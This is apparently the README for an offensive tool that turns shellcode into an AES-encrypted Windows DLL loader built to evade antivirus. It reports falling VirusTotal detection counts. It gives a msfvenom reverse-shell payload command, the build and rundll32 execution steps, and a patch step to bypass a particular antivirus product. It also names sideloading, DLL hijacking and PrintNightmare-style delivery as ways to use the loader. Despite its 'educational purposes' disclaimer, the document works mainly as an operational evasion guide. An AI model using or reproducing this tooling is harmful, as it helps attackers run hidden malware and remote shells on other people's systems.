# ShellcodeEncrypt2DLL

A script to generate AV evaded(static) DLL shellcode loader with AES encryption.

Shellcode and API names encryption + Dynamic API loading

Two modes:
- non-standalone: To make an encrypted DLL **WITHOUT** KEY stored in the DLL.You can use it for sideload/rundll32 but you need to pass the key. (So even if the sample is captured, the shellcode will be still difficult to recover)
- standalone: To make an encrypted DLL **WITH** KEY stored in the DLL. You can use it for sideload/hijack or in a printnightmare-like scenario.



VT: 2/72 (13/3/2025)

VT: 3/72 (14/3/2025)

VT: 3/73 (27/3/2025)

**VT: 0/72 (28/3/2025) (after update)**

![](https://raw.githubusercontent.com/restkhz/blogImages/main/img/屏幕截图_20250328_193321.png)



![](https://raw.githubusercontent.com/restkhz/blogImages/main/img/屏幕截图_20250313_060155.png)

## Usage

You can use this on **Kali** or other linux distributions

Dependencies:
```
pip install pycryptodome
sudo apt install mingw-w64
```
I know no one wants to memorize a bunch of arguments…
**Edit your key in the `ShellcodeEncrypt2Dll.py` first** 

Example:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 x64/xor_dynamic -f raw > shellcode.raw

python ShellcodeEncrypt2Dll.py --non-standalone shellcode.raw
or
python ShellcodeEncrypt2Dll.py --standalone shellcode.raw
```

Then you will get a `loader.dll`

For a particular antivirus program, we need to patch the dll to bypass…

```
python patch.py (optional)
```

Then you will get a `loader_patched.dll`

For non-standalone:
```
rundll32 <path_to_dll>,EPoint <Your KEY>
```
You can make you own exe to load this DLL with KEY as well.

For standalone:
```
rundll32 <path_to_dll>,EPoint
```

As you see, standalone and non-standalone both have `EPoint` as export function.




Your can edit your key in the python script.

## How does it work?

This script will generate a header file for template.cpp, then try to compile with `x86_64-w64-mingw32-g++`.
The `shellcode` and `function names` like `VirtuallAlloc`, `CreateThread` etc will be encrypted(AES-CBC) with key.

Hide suspicious strings as much as possible…

Considering entropy…

The standalone mode will store the key in the DLL. Decrypt itself when running.
The non-standalone mode needs your key as a parameter to decrypt itself when running.

## Disclaimer

Submitted to VirusTotal already. Only for educational purposes.
